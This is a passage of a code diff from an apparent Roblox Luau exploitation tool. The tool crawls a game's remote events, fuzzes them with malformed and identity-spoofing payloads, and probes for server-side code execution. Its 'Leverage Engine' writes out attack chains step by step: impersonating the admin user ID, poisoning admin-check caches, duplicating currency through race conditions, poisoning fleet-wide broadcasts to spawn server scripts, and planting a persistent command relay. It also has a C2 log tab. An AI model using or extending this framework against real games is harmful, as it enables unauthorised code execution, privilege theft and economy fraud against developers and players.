-            -- ── Check 1: RCE signature scan (Mode 2) ─────────────
+            -- -- Check 1: RCE signature scan (Mode 2) -------------
             if self.mode == 2 and probe.isRCEProbe then
                 for _, arg in ipairs(args) do
                     local sig = containsRCESig(arg)
@@ -10151,14 +10151,14 @@ function DAL:_onServerResponse(remotePath, ...)
                             remotePath,
                             probe.payload,
                             "Server echoed execution signature '" .. sig ..
-                            "' — probe string treated as instruction. LEDGE CONFIRMED.",
+                            "' -- probe string treated as instruction. LEDGE CONFIRMED.",
                             traceId
                         )
                     end
                 end
             end
 
-            -- ── Check 2: Differential state (after 300ms settle) ─
+            -- -- Check 2: Differential state (after 300ms settle) -
             if probe.snapshotBefore and probe.isMutation then
                 task.delay(0.30, function()
                     local snapAfter = captureSnapshot()
@@ -10180,13 +10180,13 @@ function DAL:_onServerResponse(remotePath, ...)
     end
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   REMOTE CRAWLER
 --   Recursively walks ReplicatedStorage, ReplicatedFirst, Workspace.
 --   Attaches an OnClientEvent listener to every RemoteEvent found.
 --   Safe: uses pcall on restricted containers.
 --   Re-runs every CRAWL_INTERVAL seconds to catch dynamic additions.
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local function getRemotePath(inst)
     local parts = { inst.Name }
     local p = inst.Parent
@@ -10271,11 +10271,11 @@ function DAL:startCrawlLoop()
     end)
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   PROBE FIRE
---   Core method — fires one payload at one remote, manages the
+--   Core method -- fires one payload at one remote, manages the
 --   trace ID, snapshot, timeout, and silent-processing verdict.
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 function DAL:fireProbe(remotePath, payload, meta)
     local rec = self.discovered[remotePath]
     if not rec then return nil end
@@ -10326,7 +10326,7 @@ function DAL:fireProbe(remotePath, payload, meta)
         )
     end
 
-    -- Timeout watchdog — no response = silent processing
+    -- Timeout watchdog -- no response = silent processing
     task.delay(self.PROBE_TIMEOUT, function()
         local probe = self.activeProbes[traceId]
         if probe and not probe.responseReceived and probe.isMutation then
@@ -10335,7 +10335,7 @@ function DAL:fireProbe(remotePath, payload, meta)
                 remotePath, payload,
                 string.format(
                     "Server did not respond within %.1fs after malformed payload. " ..
-                    "Silent processing suspected — server consumed bad data without rejecting it.",
+                    "Silent processing suspected -- server consumed bad data without rejecting it.",
                     self.PROBE_TIMEOUT
                 ),
                 traceId
@@ -10347,15 +10347,15 @@ function DAL:fireProbe(remotePath, payload, meta)
     return traceId
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   ADAPTIVE FUZZER
 --   Runs four phases against a single remote.
---   Phase 1 — Type Confusion
---   Phase 2 — Deep Nesting
---   Phase 3 — Identity Substitution
---   Phase 4 — RCE Probes  (Mode 2 only)
+--   Phase 1 -- Type Confusion
+--   Phase 2 -- Deep Nesting
+--   Phase 3 -- Identity Substitution
+--   Phase 4 -- RCE Probes  (Mode 2 only)
 --   Plus two context probes: nil arg, multi-arg overflow
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 function DAL:fuzzRemote(remotePath, onProgress, onComplete)
     local rec = self.discovered[remotePath]
     if not rec then
@@ -10374,26 +10374,26 @@ function DAL:fuzzRemote(remotePath, onProgress, onComplete)
         end
 
         -- Phase 1
-        if onProgress then onProgress("► Phase 1: Type Confusion", total) end
+        if onProgress then onProgress("> Phase 1: Type Confusion", total) end
         for _, m in ipairs(MUTATIONS.TYPE_CONFUSION) do
             fire(m, { isMutation = true })
         end
 
         -- Phase 2
-        if onProgress then onProgress("► Phase 2: Deep Nesting", total) end
+        if onProgress then onProgress("> Phase 2: Deep Nesting", total) end
         for _, m in ipairs(MUTATIONS.DEEP_NEST) do
             fire(m, { isMutation = true })
         end
 
-        -- Phase 3 (build fresh — captures current server population)
-        if onProgress then onProgress("► Phase 3: Identity Substitution", total) end
+        -- Phase 3 (build fresh -- captures current server population)
+        if onProgress then onProgress("> Phase 3: Identity Substitution", total) end
         for _, m in ipairs(buildIdentityMutations()) do
             fire(m, { isMutation = true, isIdentityProbe = true })
         end
 
         -- Phase 4 (Mode 2 only)
         if self.mode == 2 then
-            if onProgress then onProgress("► Phase 4: RCE Boundary Probes", total) end
+            if onProgress then onProgress("> Phase 4: RCE Boundary Probes", total) end
             for _, m in ipairs(MUTATIONS.RCE_PROBES) do
                 fire(m, { isMutation = true, isRCEProbe = true })
             end
@@ -10441,14 +10441,14 @@ function DAL:fuzzAll(onProgress, onComplete)
     next()
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   EXECUTION BOUNDARY DETECTOR  (EBD)
 --   Mode 2 sub-system.
---   Step 1: Static name scoring — does the remote name contain
+--   Step 1: Static name scoring -- does the remote name contain
 --           keywords associated with execution sinks?
---   Step 2: RCE probe battery — fires environment-check strings
+--   Step 2: RCE probe battery -- fires environment-check strings
 --           and watches for execution signatures in the response.
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local EBD_SINK_KEYWORDS = {
     "eval", "exec", "run", "load", "interpret", "compile",
     "execute", "invoke", "dispatch", "process", "handle",
@@ -10504,13 +10504,13 @@ function DAL:probeRCEBoundary(remotePath, onResult)
     end)
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   DOUBLE INGRESS MAPPER
 --   Finds the structural precondition for Fleet-Wide Broadcast Poisoning.
 --   Cannot read server scripts, so uses name-pattern matching to flag
 --   remotes that are architecturally likely to touch MessagingService.
---   A structural match IS the finding — you don't need to detonate it.
--- ══════════════════════════════════════════════════════════════════
+--   A structural match IS the finding -- you don't need to detonate it.
+-- ==================================================================
 local INGRESS_PATTERNS = {
     "broadcast", "fleet", "global", "crossserver", "cross_server",
     "publish",   "message", "announce", "notify", "alert",
@@ -10543,11 +10543,11 @@ function DAL:mapDoubleIngress()
     return flagged
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   RACE CONDITION PRECONDITION DETECTOR
 --   Looks for structural absence of debounce/mutex on high-value remotes.
 --   Uses name heuristics (economy, state-change verbs) to flag candidates.
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local RACE_HIGH_VALUE = {
     "buy", "purchase", "sell", "trade", "transfer",
     "redeem", "claim", "collect", "upgrade", "equip",
@@ -10581,7 +10581,7 @@ function DAL:scanRacePreconditions()
     return flagged
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   LEVERAGE ENGINE
 --
 --   Purpose: turn a raw violation into an actionable roadmap toward
@@ -10591,27 +10591,27 @@ end
 --   obtaining Sandbox Remote Code Execution?
 --
 --   Architecture:
---     1. STATIC PRE-SCANNER   — reads each remote before touching it.
+--     1. STATIC PRE-SCANNER   -- reads each remote before touching it.
 --                               Scores name patterns against known
 --                               execution-sink keywords, identity-drop
 --                               patterns, and broadcast-ingress markers.
 --                               This is the "direct way to find bugs"
 --                               without blind fuzzing.
 --
---     2. LEVERAGE RESOLVER    — given a violation type + remote context,
+--     2. LEVERAGE RESOLVER    -- given a violation type + remote context,
 --                               produces a structured LeveragePlan:
 --                               { step, technique, payload, nodeType,
 --                                 rceProximity, rationale }
 --
---     3. LEVERAGE LOG         — ordered list of plans (newest first),
+--     3. LEVERAGE LOG         -- ordered list of plans (newest first),
 --                               surfaced in the LEVERAGE tab of the UI.
 --
---     4. APPLY TO NODE        — pushes a LeveragePlan into the S->S
+--     4. APPLY TO NODE        -- pushes a LeveragePlan into the S->S
 --                               graph as a real node so the finding
 --                               becomes part of the attack chain.
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 
--- ── RCE Proximity scale ───────────────────────────────────────────
+-- -- RCE Proximity scale -------------------------------------------
 -- How many confirmed steps away from SB-RCE is this finding?
 -- 1 = direct execution boundary confirmed
 -- 2 = one hop away (e.g. identity loss into an exec-capable system)
@@ -10622,7 +10622,7 @@ local RCE_PROX = {
     STRUCTURAL  = 3,
 }
 
--- ── Leverage Plan schema ──────────────────────────────────────────
+-- -- Leverage Plan schema ------------------------------------------
 -- Every plan produced by the engine has this shape:
 -- {
 --   id          : string           unique plan ID
@@ -10652,7 +10652,7 @@ local function newPlanId()
     return string.format("LP-%04d", _planSeq)
 end
 
--- ── Static Pre-Scanner ───────────────────────────────────────────
+-- -- Static Pre-Scanner -------------------------------------------
 -- Scores a remote before any fuzzing happens. Returns a pre-scan
 -- record with risk signals that guide which probes to run first.
 
@@ -10742,9 +10742,9 @@ function LE:rankRemotes()
     return ranked
 end
 
--- ── Leverage Resolver ────────────────────────────────────────────
+-- -- Leverage Resolver --------------------------------------------
 -- Given a violation, produce a concrete LeveragePlan.
--- This is the core of the engine — each branch maps a violation
+-- This is the core of the engine -- each branch maps a violation
 -- type to a specific technique, payload, node type, and step list.
 
 local LEVERAGE_RULES = {
@@ -10754,20 +10754,20 @@ local LEVERAGE_RULES = {
             technique    = "Execution Sink Injection",
             rceProximity = RCE_PROX.DIRECT,
             nodeType     = "EXEC_SINK",
-            nodeLabel    = "⚡ " .. (preScan and preScan.name or "RCE Target"),
+            nodeLabel    = "** " .. (preScan and preScan.name or "RCE Target"),
             rationale    = "Server echoed an execution signature or this remote's name " ..
-                           "directly matches a known exec sink. The data→instruction " ..
+                           "directly matches a known exec sink. The data->instruction " ..
                            "boundary has been located. This is the ledge.",
             steps = {
                 "1. Add this remote as an EXEC_SINK node in your S->S graph.",
                 "2. Confirm the server evaluates string payloads by sending: " ..
-                   "tostring(type(getfenv())) — if it echoes back 'function', execution confirmed.",
+                   "tostring(type(getfenv())) -- if it echoes back 'function', execution confirmed.",
                 "3. Escalate to an environment dump probe: " ..
                    "send a payload that reads game.PlaceId from getfenv() and checks for echo.",
                 "4. If execution confirmed: inject a persistent listener using a " ..
                    "BindableEvent as a command relay so you can issue further instructions " ..
                    "without re-firing the remote each time.",
-                "5. Mark this chain CRITICAL in the Custody Ledger — identity here is server.",
+                "5. Mark this chain CRITICAL in the Custody Ledger -- identity here is server.",
             },
             payload = "tostring(type(getfenv and getfenv() or load))",
         }
@@ -10778,16 +10778,16 @@ local LEVERAGE_RULES = {
             technique    = "UserId Substitution via Bindable Drop",
             rceProximity = RCE_PROX.ONE_HOP,
             nodeType     = "IDENTITY_SPOOF",
-            nodeLabel    = "👤 Identity Drop — " .. (preScan and preScan.name or v.remotePath),
+            nodeLabel    = "[user] Identity Drop -- " .. (preScan and preScan.name or v.remotePath),
             rationale    = "This remote passes data to a downstream Bindable without " ..
                            "preserving the Player object. The receiving script identifies " ..
-                           "the caller by a client-supplied value — which you control.",
+                           "the caller by a client-supplied value -- which you control.",
             steps = {
                 "1. Add this remote as an IDENTITY_DROP node in your S->S graph.",
                 "2. Fire the remote with UserId = 1 (Roblox admin) as the identity argument.",
                 "3. Observe whether the downstream action is applied to a different player " ..
                    "or grants elevated permissions.",
-                "4. If confirmed: chain this into a SESSION_CACHE write — " ..
+                "4. If confirmed: chain this into a SESSION_CACHE write -- " ..
                    "poison the cache key that the admin-check system reads.",
                 "5. From there, any remote that trusts that cache key now treats you as admin.",
                 "6. Leverage admin status to locate a loadstring or require sink " ..
@@ -10806,9 +10806,9 @@ local LEVERAGE_RULES = {
                 or  "Silent-Processing State Mutation",
             rceProximity = isHighValue and RCE_PROX.ONE_HOP or RCE_PROX.STRUCTURAL,
             nodeType     = "SILENT_SINK",
-            nodeLabel    = "🔇 Silent Sink — " .. (preScan and preScan.name or v.remotePath),
+            nodeLabel    = "[mute] Silent Sink -- " .. (preScan and preScan.name or v.remotePath),
             rationale    = "Server consumed malformed data without rejecting or erroring. " ..
-                           "This means validation is absent — the server is working with " ..
+                           "This means validation is absent -- the server is working with " ..
                            "whatever you send. " .. (isHighValue
                                and "Combined with this remote's exec-sink signals, " ..
                                    "silent processing here means injected code may run silently."
@@ -10816,12 +10816,12 @@ local LEVERAGE_RULES = {
                                    "visible error telling the developer something is wrong."),
             steps = {
                 "1. Add this remote as a SILENT_SINK node in your S->S graph.",
-                "2. Send progressively more dangerous payloads — start with type mismatches, " ..
+                "2. Send progressively more dangerous payloads -- start with type mismatches, " ..
                    "escalate to environment probe strings.",
                 "3. Watch for any state change in Leaderstats, character, or attributes " ..
                    "after each fire (DAL differential snapshot will catch this).",
                 "4. If the remote has exec-sink signals: send the RCE probe battery " ..
-                   "directly — silent acceptance means no error wall to stop it.",
+                   "directly -- silent acceptance means no error wall to stop it.",
                 "5. If state mutation confirmed: map which other systems read that state " ..
                    "and whether any of them touch a loadstring or require path.",
             },
@@ -10834,7 +10834,7 @@ local LEVERAGE_RULES = {
             technique    = "Fleet-Wide Broadcast Poisoning via Double Ingress",
             rceProximity = RCE_PROX.ONE_HOP,
             nodeType     = "FLEET_INGRESS",
-            nodeLabel    = "📡 Fleet Ingress — " .. (preScan and preScan.name or v.remotePath),
+            nodeLabel    = "[signal] Fleet Ingress -- " .. (preScan and preScan.name or v.remotePath),
             rationale    = "This remote feeds data into a MessagingService:PublishAsync " ..
                            "path. Any server in the fleet that subscribes and blindly " ..
                            "processes the incoming message will execute your payload. " ..
@@ -10844,12 +10844,12 @@ local LEVERAGE_RULES = {
                 "2. Confirm the double-ingress chain: fire this remote with a sentinel " ..
                    "value and watch whether other connected servers receive it via C2 log.",
                 "3. Craft a poisoned payload targeting the receiving server's " ..
-                   "SubscribeAsync handler — look for Instance.new, DataStore writes, " ..
+                   "SubscribeAsync handler -- look for Instance.new, DataStore writes, " ..
                    "or eval-style functions in the handler logic.",
                 "4. If the handler does Instance.new(payload): send 'Script' as payload " ..
                    "to instantiate a bare server script.",
                 "5. Achieving fleet-wide execution from a single client fire is the " ..
-                   "highest-impact outcome — log this chain immediately in Custody Ledger.",
+                   "highest-impact outcome -- log this chain immediately in Custody Ledger.",
             },
             payload = "{ __fleet_probe = true, __sentinel = 'DAL_FW_7f3a', data = '' }",
         }
@@ -10860,7 +10860,7 @@ local LEVERAGE_RULES = {
             technique    = "Concurrent State Corruption (Race Condition)",
             rceProximity = RCE_PROX.STRUCTURAL,
             nodeType     = "RACE_TARGET",
-            nodeLabel    = "⚡ Race — " .. (preScan and preScan.name or v.remotePath),
+            nodeLabel    = "** Race -- " .. (preScan and preScan.name or v.remotePath),
             rationale    = "This remote touches an economy or state value without a " ..
                            "confirmed debounce or mutex. Rapid concurrent fires can pass " ..
                            "the 'do they have enough?' check multiple times before the " ..
@@ -10872,8 +10872,8 @@ local LEVERAGE_RULES = {
                    "the state is updated (check Leaderstats in DAL snapshot diff).",
                 "4. If race confirmed: use the duplicated state to accumulate resources " ..
                    "that can then be spent on a higher-privilege action.",
-                "5. Chain: race-duplicated currency → buy admin item → " ..
-                   "admin item triggers loadstring path → SB-RCE.",
+                "5. Chain: race-duplicated currency -> buy admin item -> " ..
+                   "admin item triggers loadstring path -> SB-RCE.",
             },
             payload = "-- Fire 100x in loop: remote:FireServer(itemId)",
         }
@@ -10881,22 +10881,22 @@ local LEVERAGE_RULES = {
 
     [VTYPE.LOGIC_BYPASS] = function(v, preScan)
         return {
-            technique    = "Assumption Violation — Logic Bypass",
+            technique    = "Assumption Violation -- Logic Bypass",
             rceProximity = RCE_PROX.STRUCTURAL,
             nodeType     = "BYPASS_POINT",
-            nodeLabel    = "🚪 Bypass — " .. (preScan and preScan.name or v.remotePath),
+            nodeLabel    = "[exit] Bypass -- " .. (preScan and preScan.name or v.remotePath),
             rationale    = "The server is making a trust-based decision about this input " ..
                            "rather than a validation-based one. The developer assumed " ..
-                           "something about what the client would send — you violated that.",
+                           "something about what the client would send -- you violated that.",
             steps = {
                 "1. Add this remote as a BYPASS_POINT node in your S->S graph.",
                 "2. Identify the specific assumption being violated " ..
                    "(type, range, context, timing).",
                 "3. Escalate the violation: if a string bypass works, try a table; " ..
                    "if a number bypass works, try math.huge or NaN.",
-                "4. Map where the bypassed value flows next — does it reach a " ..
+                "4. Map where the bypassed value flows next -- does it reach a " ..
                    "loadstring, require, or getfenv path downstream?",
-                "5. If yes: you have a full Source→Bypass→Sink chain. " ..
+                "5. If yes: you have a full Source->Bypass->Sink chain. " ..
                    "Apply all three nodes to the S->S graph and run EXECUTE.",
             },
             payload = v.payload or "math.huge",
@@ -10908,7 +10908,7 @@ local LEVERAGE_RULES = {
             technique    = "Differential State Mutation",
             rceProximity = RCE_PROX.STRUCTURAL,
             nodeType     = "STATE_SINK",
-            nodeLabel    = "📊 State Sink — " .. (preScan and preScan.name or v.remotePath),
+            nodeLabel    = "[stats] State Sink -- " .. (preScan and preScan.name or v.remotePath),
             rationale    = "A malformed payload caused unexpected server state to change. " ..
                            "The server is not isolating the effects of this remote. " ..
                            "Data intended for one system is bleeding into another.",
@@ -10917,10 +10917,10 @@ local LEVERAGE_RULES = {
                 "2. Identify exactly which state changed (DAL snapshot diff shows this).",
                 "3. Determine whether the mutated state is read by a security-sensitive " ..
                    "system (admin check, anti-cheat, DataStore write).",
-                "4. If yes: this is a Lateral Transport Trust hole — " ..
+                "4. If yes: this is a Lateral Transport Trust hole -- " ..
                    "poison this state deliberately with an identity or permission value.",
-                "5. Chain into identity loss: mutated state → admin check reads it → " ..
-                   "you are treated as admin → exec sink access.",
+                "5. Chain into identity loss: mutated state -> admin check reads it -> " ..
+                   "you are treated as admin -> exec sink access.",
             },
             payload = v.payload or "{ spoofed = true, role = 'admin', uid = 1 }",
         }
@@ -10933,19 +10933,19 @@ local function defaultLeverageRule(v, preScan)
         technique    = "General Assumption Violation",
         rceProximity = RCE_PROX.STRUCTURAL,
         nodeType     = "GENERIC_FINDING",
-        nodeLabel    = "⚠ Finding — " .. (preScan and preScan.name or v.remotePath),
+        nodeLabel    = "[!] Finding -- " .. (preScan and preScan.name or v.remotePath),
         rationale    = "A structural flaw was detected. " ..
                        "Map its downstream flow to determine exploit potential.",
         steps = {
             "1. Add this remote to your S->S graph.",
-            "2. Trace where its output flows — look for exec sinks downstream.",
+            "2. Trace where its output flows -- look for exec sinks downstream.",
             "3. Escalate probing on this remote with the RCE probe battery.",
         },
-        payload = "—",
+        payload = "--",
     }
 end
 
--- ── Main resolve function ─────────────────────────────────────────
+-- -- Main resolve function -----------------------------------------
 function LE:resolve(violation)
     local ruleFn = LEVERAGE_RULES[violation.vtype] or defaultLeverageRule
 
@@ -10987,7 +10987,7 @@ DAL.onViolation = function(v)
     if v then LE:resolve(v) end
 end
 
--- ── Apply to Node ─────────────────────────────────────────────────
+-- -- Apply to Node -------------------------------------------------
 -- Pushes a LeveragePlan into the S->S graph as a real node.
 -- Reads the existing ssCtx node table and inserts a new entry.
 function LE:applyToNode(plan)
@@ -11024,7 +11024,7 @@ function LE:applyToNode(plan)
     return true, nodeId
 end
 
--- ── Ranked scan shortcut ──────────────────────────────────────────
+-- -- Ranked scan shortcut ------------------------------------------
 -- Run the pre-scanner across all discovered remotes, auto-generate
 -- a leverage plan for every high-score remote without waiting for
 -- fuzzing to produce a violation first.
@@ -11047,7 +11047,7 @@ function LE:scanAndResolveAll()
                 remotePath = ps.path,
                 payload    = "static:pre-scan",
                 evidence   = "Pre-scan score " .. ps.score ..
-                             " — signals: " .. table.concat(ps.signals, ", "),
+                             " -- signals: " .. table.concat(ps.signals, ", "),
                 traceId    = "PRESCAN",
                 mode       = DAL.mode,
             }
@@ -11058,14 +11058,14 @@ function LE:scanAndResolveAll()
     return count, ranked
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   UI PANEL
---   420 × 510 draggable panel with 4 tabs:
---     [REMOTES]    — discovered remote list, per-remote fuzz button
---     [VIOLATIONS] — live violation registry with severity colour coding
---     [FUZZER]     — mutation library display, global fuzz controls
---     [C2 LOG]     — raw DALSink sink stream
--- ══════════════════════════════════════════════════════════════════
+--   420 x 510 draggable panel with 4 tabs:
+--     [REMOTES]    -- discovered remote list, per-remote fuzz button
+--     [VIOLATIONS] -- live violation registry with severity colour coding
+--     [FUZZER]     -- mutation library display, global fuzz controls
+--     [C2 LOG]     -- raw DALSink sink stream
+-- ==================================================================
 local PANEL_W, PANEL_H = 420, 510
 local COL = {
     BG     = Color3.fromRGB(10,  12,  20),
@@ -11150,7 +11150,7 @@ local function mkBtn(parent, x, y, w, h, text, bgCol, textCol, zi)
     return b
 end
 
--- ── Severity badge ────────────────────────────────────────────────
+-- -- Severity badge ------------------------------------------------
 local function mkSevBadge(parent, x, y, sev)
     local bg = mkFrame(parent, x, y, 58, 14, sev.col, 0.65, parent.ZIndex + 1)
     uiCorner(bg, 3)
@@ -11159,7 +11159,7 @@ local function mkSevBadge(parent, x, y, sev)
     return bg
 end
 
--- ── Scrolling container helper ────────────────────────────────────
+-- -- Scrolling container helper ------------------------------------
 local function mkScroll(parent, x, y, w, h, zi)
     local s = Instance.new("ScrollingFrame")
     s.Position                = UDim2.fromOffset(x, y)
@@ -11179,21 +11179,21 @@ local function mkScroll(parent, x, y, w, h, zi)
     return s
 end
 
--- ── Main panel builder ────────────────────────────────────────────
+-- -- Main panel builder --------------------------------------------
 -- NOTE: DAL now lives inside its own dedicated tab page (built and
 -- captured earlier as DALPage), not floating inside the shared
 -- ContentArea. The root frame fills that page completely instead of
 -- using a fixed pixel size + manual drag -- the outer tool's own
 -- drag/resize already covers that, so DAL just needs to fill its slot.
--- ════════════════════════════════════════════════════════════════════
---   TAB BUILDERS — split out of buildPanel
+-- ====================================================================
+--   TAB BUILDERS -- split out of buildPanel
 --   Luau caps every function body at 200 local registers. The original
 --   monolithic buildPanel() built all four tabs inline and blew past
 --   that limit. Each tab now gets its own function and its own
 --   independent 200-register budget.
--- ════════════════════════════════════════════════════════════════════
+-- ====================================================================
 
--- ── TAB 1 — REMOTES ─────────────────────────────────────────────────
+-- -- TAB 1 -- REMOTES -------------------------------------------------
 local function buildRemotesTab(remPage, PW, PH, switchTab)
     local remBar = mkFrame(remPage, 0, 0, PW, 26, Color3.new(0,0,0), 1, 52)
     local crawlBtn    = mkBtn(remBar,  4,  4,  54, 18, "CRAWL",
@@ -11244,15 +11244,15 @@ local function buildRemotesTab(remPage, PW, PH, switchTab)
 
             local captPath = path
             fb.MouseButton1Click:Connect(function()
-                fb.Text = "…"
+                fb.Text = "..."
                 DAL:fuzzRemote(captPath, nil, function()
-                    fb.Text = "✓"
+                    fb.Text = "[OK]"
                 end)
             end)
             rb.MouseButton1Click:Connect(function()
-                rb.Text = "…"
+                rb.Text = "..."
                 DAL:probeRCEBoundary(captPath, function()
-                    rb.Text = "✓"
+                    rb.Text = "[OK]"
                     switchTab(2)
                 end)
             end)
@@ -11262,13 +11262,13 @@ local function buildRemotesTab(remPage, PW, PH, switchTab)
     end
 
     crawlBtn.MouseButton1Click:Connect(function()
-        crawlBtn.Text = "…"
+        crawlBtn.Text = "..."
         DAL:crawl()
         crawlBtn.Text = "CRAWL"
         rebuildRemoteList()
     end)
     fuzzAllBtn.MouseButton1Click:Connect(function()
-        fuzzAllBtn.Text = "RUNNING…"
+        fuzzAllBtn.Text = "RUNNING..."
         DAL:fuzzAll(nil, function()
             fuzzAllBtn.Text = "FUZZ ALL"
         end)
@@ -11290,7 +11290,7 @@ local function buildRemotesTab(remPage, PW, PH, switchTab)
     return rebuildRemoteList
 end
 
--- ── TAB 2 — VIOLATIONS ──────────────────────────────────────────────
+-- -- TAB 2 -- VIOLATIONS ----------------------------------------------
 local function buildViolationsTab(violPage, PW, PH)
     local ROW_H  = 68   -- taller rows to fit the LEVERAGE button
     local violScroll = mkScroll(violPage, 2, 2, PW - 4, PH - 4, 52)
@@ -11322,7 +11322,7 @@ local function buildViolationsTab(violPage, PW, PH)
 
             -- Remote path
             mkLabel(row, 7, 21, PW - 20, 13,
-                "→ " .. v.remotePath, 7, COL.DIM,
+                "-> " .. v.remotePath, 7, COL.DIM,
                 Enum.TextXAlignment.Left, 54)
 
             -- Evidence
@@ -11330,9 +11330,9 @@ local function buildViolationsTab(violPage, PW, PH)
                 v.evidence:sub(1, 80), 7, Color3.fromRGB(160,175,210),
                 Enum.TextXAlignment.Left, 54)
 
-            -- ── LEVERAGE button ──────────────────────────────────
+            -- -- LEVERAGE button ----------------------------------
             local leverageBtn = mkBtn(row, 7, ROW_H - 22, 110, 18,
-                "⬡ LEVERAGE ▸  S→S",
+                "[DAL] LEVERAGE >  S->S",
                 Color3.fromRGB(200,40,220), Color3.fromRGB(200,40,220), 55)
 
             -- Apply-to-node shortcut button
@@ -11347,10 +11347,10 @@ local function buildViolationsTab(violPage, PW, PH)
             end)
 
             applyBtn.MouseButton1Click:Connect(function()
-                applyBtn.Text = "…"
+                applyBtn.Text = "..."
                 local report = DAL:getLeverageReport(captV)
                 local ok, result = DAL:applyToNode(report)
-                applyBtn.Text = ok and "✓ Added" or "✗ Failed"
+                applyBtn.Text = ok and "[OK] Added" or "[X] Failed"
                 task.delay(2, function()
                     applyBtn.Text = "APPLY TO NODE"
                 end)
@@ -11368,7 +11368,7 @@ local function buildViolationsTab(violPage, PW, PH)
     return rebuildViolations
 end
 
--- ── TAB 3 — FUZZER ──────────────────────────────────────────────────
+-- -- TAB 3 -- FUZZER --------------------------------------------------
 local function buildFuzzerTab(fuzzPage, PW, PH, rebuildViolations)
     mkLabel(fuzzPage, 8, 4, PW - 16, 18,
         "Select a remote on the REMOTES tab and press FUZZ,",
@@ -11410,7 +11410,7 @@ local function buildFuzzerTab(fuzzPage, PW, PH, rebuildViolations)
             mkLabel(pBg, 0, 0, 84, 14, entry.phase, 6, pc,
                 Enum.TextXAlignment.Center, 55)
             mkLabel(row, 92, 0, PW - 108, 18,
-                entry.m.label .. "  →  " .. tostring(entry.m.payload):sub(1,50),
+                entry.m.label .. "  ->  " .. tostring(entry.m.payload):sub(1,50),
                 7, COL.TEXT, Enum.TextXAlignment.Left, 54)
         end
         mutScroll.CanvasSize = UDim2.fromOffset(0, #allMuts * 20)
@@ -11427,7 +11427,7 @@ local function buildFuzzerTab(fuzzPage, PW, PH, rebuildViolations)
     end)
 end
 
--- ── TAB 4 — C2 LOG ──────────────────────────────────────────────────
+-- -- TAB 4 -- C2 LOG --------------------------------------------------
 local function buildC2LogTab(c2Page, PW, PH)
     local c2Scroll = mkScroll(c2Page, 2, 2, PW - 4, PH - 4, 52)
 
@@ -11456,7 +11456,7 @@ local function buildC2LogTab(c2Page, PW, PH)
 
             local prefix = entry.type == "DISCOVERY"
                 and string.format("[DISC] %s", entry.path or "")
-                or  string.format("[%s] %s — %s",
+                or  string.format("[%s] %s -- %s",
                         entry.sev   or "?",
                         entry.path  or "",
                         (entry.evidence or ""):sub(1, 55))
@@ -11470,7 +11470,7 @@ local function buildC2LogTab(c2Page, PW, PH)
     DALSink.onEntry = function(_) rebuildC2() end
 end
 
--- ── STATS DASHBOARD ──────────────────────────────────────────────────
+-- -- STATS DASHBOARD --------------------------------------------------
 -- Always-visible live counters: remotes found, total violations,
 -- critical+ count, confirmed SB-RCE count. This is what makes DAL
 -- read as a live control center instead of a static list -- numbers
@@ -11559,7 +11559,7 @@ local function buildStatsBar(root, PW)
     return updateStats
 end
 
--- ── CRITICAL ALERT BANNER ────────────────────────────────────────────
+-- -- CRITICAL ALERT BANNER --------------------------------------------
 -- Slides down over the header when a CRITICAL or SB-RCE violation
 -- lands, then retracts after a few seconds. Makes the tool feel like
 -- it's actively watching rather than a static report you have to
@@ -11592,7 +11592,7 @@ local function buildAlertBanner(root, PW)
         local myToken = hideToken
         local isRCE = (v.severity.label == "SB-RCE")
         banner.BackgroundColor3 = isRCE and Color3.fromRGB(200, 40, 220) or Color3.fromRGB(228, 60, 80)
-        lbl.Text = string.format("⚠  %s  —  %s  —  %s",
+        lbl.Text = string.format("[!]  %s  --  %s  --  %s",
             v.severity.label, v.vtype, v.remotePath)
         banner.Visible  = true
         banner.Position = UDim2.fromOffset(0, -28)
@@ -11610,7 +11610,7 @@ local function buildAlertBanner(root, PW)
     return trigger
 end
 
--- ── TAB 5 — LEVERAGE ────────────────────────────────────────────────
+-- -- TAB 5 -- LEVERAGE ------------------------------------------------
 local function buildLeverageTab(levPage, PW, PH, switchTab)
     -- Header bar with PRE-SCAN and SCAN ALL buttons
     local levBar = mkFrame(levPage, 0, 0, PW, 26, Color3.new(0,0,0), 1, 52)
@@ -11679,7 +11679,7 @@ local function buildLeverageTab(levPage, PW, PH, switchTab)
 
             -- Remote path
             mkLabel(card, 9, 20, PW - 20, 11,
-                "→ " .. plan.remotePath, 7, COL.DIM,
+                "-> " .. plan.remotePath, 7, COL.DIM,
                 Enum.TextXAlignment.Left, 54)
 
             -- Rationale (truncated)
@@ -11711,7 +11711,7 @@ local function buildLeverageTab(levPage, PW, PH, switchTab)
 
             -- APPLY TO NODE button
             local applyBtn = mkBtn(card, PW - 120, 72, 50, 16,
-                plan.applied and "✓ APPLIED" or "APPLY",
+                plan.applied and "[OK] APPLIED" or "APPLY",
                 plan.applied
                     and Color3.fromRGB(60, 120, 60)
                     or  Color3.fromRGB(200, 40, 220),
@@ -11730,7 +11730,7 @@ local function buildLeverageTab(levPage, PW, PH, switchTab)
                 if not captPlan.applied then
                     local ok, result = LE:applyToNode(captPlan)
                     if ok then
-                        applyBtn.Text             = "✓ APPLIED"
+                        applyBtn.Text             = "[OK] APPLIED"
                         applyBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 60)
                         applyBtn.TextColor3       = Color3.fromRGB(100, 220, 100)
                     end
@@ -11797,7 +11797,7 @@ local function buildLeverageTab(levPage, PW, PH, switchTab)
     end
 
     preScanBtn.MouseButton1Click:Connect(function()
-        preScanBtn.Text = "…"
+        preScanBtn.Text = "..."
         task.spawn(function()
             local count, ranked = LE:scanAndResolveAll()
             preScanBtn.Text = "PRE-SCAN"
@@ -11806,7 +11806,7 @@ local function buildLeverageTab(levPage, PW, PH, switchTab)
